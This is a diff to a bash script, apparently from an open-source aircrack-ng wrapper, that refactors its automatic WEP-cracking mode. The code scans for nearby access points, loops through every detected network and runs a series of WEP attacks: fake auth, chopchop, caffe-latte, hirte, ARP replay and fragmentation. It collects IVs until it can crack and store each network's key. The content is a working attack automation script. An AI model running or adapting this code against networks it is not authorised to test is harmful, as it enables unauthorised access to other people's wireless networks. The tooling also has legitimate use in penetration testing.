@@ -16,34 +16,52 @@
 #        along with this program; if not, write to the Free Software
 #        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 
+filter_ssid(){
+    sleep 6;
+    echo
+    [[ "$filter_ssid" != "" ]] && {
+        tag; warn "${mark}Filtering essid to $filter_ssid";
+        grep $filter_ssid $DUMP_PATH/dump-02.csv > $DUMP_PATH/dump-03.csv;
+    } || {
+        cp $DUMP_PATH/dump-02.csv $DUMP_PATH/dump-03.csv;
+    }
+}
+
+unknown(){
+    ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
+    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
+}
+
+count_aps(){ i=0; while IFS=, read MAC; do i=$(( $i + 1 )) ; done < $DUMP_PATH/dump-03.csv ; echo $i; }
+
 doauto(){
+    source $path/autopwn
     F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
-        menu_type "WEP" && CHoosescan && sleep $time_to_scan && killall -2 "airodump-ng" && sleep 2
-        echo " done"; sleep 1
-		if [ -e $DUMP_PATH/dump-01.csv ]; then
-    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
-        ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
-    [[ "$filter_ssid" != "" ]] && { echo "$mark Filtering essid to $filter_ssid"; command grep $filter_ssid $DUMP_PATH/dump-02.csv > $DUMP_PATH/dump-03.csv ; } || { cp $DUMP_PATH/dump-02.csv $DUMP_PATH/dump-03.csv;  }
-	    while IFS=, read MAC; do i=$(( $i + 1 )) ; done < $DUMP_PATH/dump-03.csv
-        sleep 1
-        MAX_TARGETS=$i
-            echo "$mark Networks detected $MAX_TARGETS"; sleep 1
-            for i in `seq 1 $MAX_TARGETS`; do
-                echo "Trying to crack target: $i"
-    			AUTO=1; selectAp;  sleep 1
-                if [ "$Host_SSID" != "" ]; then
-                    autopwn
-                else
-                    echo "$mark Couldn't find essid, next try"
-                fi
-            done
-        else $clear; echo -n $mark;  _ "ERROR: Could not autodetect access points, have you selected an interface?"; fi
+    autoscan_autopwn;
+    unknown;
+    filter_ssid;
+    MAX_TARGETS=$(count_aps);
+    echo;
+    attack_functions=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
+    tag; warn "${mark}Networks detected $MAX_TARGETS"; sleep 1
+
+    for i in `seq 1 $MAX_TARGETS`; do
+        tag; warn "${mark}Trying to crack target $i"
+        export AUTO=2; selectAp;  sleep 1
+        if [ "$Host_SSID" != "" ]; then autopwn; 
+        else warn "${mark}Couldn't find essid, next try"; fi
+    done
     cleanautovars
 
-    echo $mark "Cracked networks: "
-    for i in /tmp/tmp.*/*.key; do
-        echo "\t$mark $i : `cat $i`"
+    tag; warn ${mark}"Cracked networks:"
+    for file in $DUMP_PATH/*.key; do
+        echo "\t${mark}$file : `cat $file`"
     done
+}
+
+continue_autocrack(){
+    single_question "Press c to configure, q to quit, any key to continue"
+    [[ "$ans" == "c" ]] && configure; [[ "$ans" == "q" ]] && { check_function doexit || source $path/internal/exit; doexit killme ; }
 }
 
 autopwn(){
@@ -52,32 +70,30 @@ autopwn(){
     sleep 1
     count=0
 
-    for i in $attack_functions; do
-        echo "$mark Attack $count. Using $i in $Host_MAC"
+    for i in ${attack_functions[@]}; do
+        tag; echo "${mark}Attack $count. Using $i in $Host_MAC"
         $i & cleanp & get_current_ivs
-        echo "$mark Needed ivs: $min_ivs"
-
+        tag; warn "${mark}Needed ivs: $min_ivs"
         while [ "1" ]; do 
-            echo -en "\r$mark IVS: `check_all_ivs`"  ;
             sleep 5 && { 
                 [[ "`check_all_ivs`" -gt "$min_ivs" ]] && { 
-                    echo; echo "$mark Trying to crack network, we have enough ivs";
+                    echo; warn "${mark}Trying to crack network, we have enough ivs";
                     cleanautovars;
                     auto autocrack;
                     cleanautovars;
-                    reset; 
-                    echo "$mark Network cracked, password stored in $DUMP_PATH/$Host_MAC.key"; 
-                    _read -n1 -p "Press enter to continue, q to exit and c to configure" foo; 
-                    [[ "$foo" == "c" ]] && configure; [[ "$foo" == "q" ]] && {
-                        check_function doexit || source $path/internal/exit
-                        doexit killme ; } 
-                } ;
+                    reset;
+                    echo "${mark}Network cracked, password stored in $DUMP_PATH/$Host_MAC.key"; 
+                    continue_autocrack
+                }
             }
+            specialwarn "\r${mark}Current IVS: `check_all_ivs`"  ;
         done
         count=$(( $count + 1 ))
     done
+
     cleanautovars
     clear=$oldclear;
+
 }
 
 check_all_ivs(){
@@ -91,14 +107,14 @@ check_all_ivs(){
 }
 
 get_current_ivs(){
-    auto return_ivs
-    [[ "$?" == 255 ]] && min_ivs=$autopwn_min_ivs || min_ivs=$?
+    auto return_ivs; a=$?
+    [[ "$a" == 255 ]] && min_ivs=$autopwn_min_ivs || min_ivs=$a
 }
 
 check_if_worked(){
     get_current_ivs
-    echo $'\t' "$mark Minium ivs required for this network: $min_ivs"
-    civs=`check_all_ivs`; echo $'\t' "$mark Current IVSs: $civs"
-    if [ "`check_all_ivs`" -gt $min_ivs ]; then echo $'\t' "$mark It worked, I have $min_ivs =)"; return 0; fi
+    echo $'\t' "${mark}Minium ivs required for this network: $min_ivs"
+    civs=`check_all_ivs`; echo $'\t' "${mark}Current IVSs: $civs"
+    if [ "`check_all_ivs`" -gt $min_ivs ]; then echo $'\t' "${mark}It worked, I have $min_ivs =)"; return 0; fi
     return 1
 }
